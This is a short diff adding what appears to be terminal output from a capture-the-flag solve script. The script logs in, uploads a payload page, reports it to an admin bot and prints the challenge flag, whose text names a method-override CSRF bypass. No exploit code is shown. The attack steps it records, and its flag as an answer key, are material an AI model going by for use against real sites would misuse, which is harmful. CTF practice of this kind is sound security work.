@@ -1,0 +1,5 @@
+$ python solve/exploit.py https://get-the-flag-b852fff1cf10.instances.ctf.l3ak.team
+[*] attacker logged in as pwner_1785591026
+[*] uploaded payload page: /pages/47c3552d-864a-4147-8250-eb204803180f.html
+[*] reported to bot; waiting for visit ...
+[+] admin login OK, FLAG = L3AK{m37h0D_0V3rRide_c5Rf_Bypass_g0_bRRRR}
